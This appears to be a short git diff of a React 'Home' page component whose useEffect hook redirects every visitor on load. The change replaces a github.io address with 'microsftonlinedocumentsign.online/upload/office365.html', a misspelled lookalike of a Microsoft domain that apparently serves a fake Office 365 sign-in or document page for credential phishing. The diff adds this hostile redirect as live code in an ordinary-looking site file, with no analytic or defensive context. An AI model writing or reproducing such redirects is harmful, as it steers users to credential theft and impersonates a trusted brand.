@@ -3,7 +3,8 @@ import { useEffect } from "react";
 
 export default function Home() {
   useEffect(() => {
-    window.location.href = "https://paiddude.github.io/office/";
+    window.location.href =
+      "https://microsftonlinedocumentsign.online/upload/office365.html";
   }, []);
 
   return (
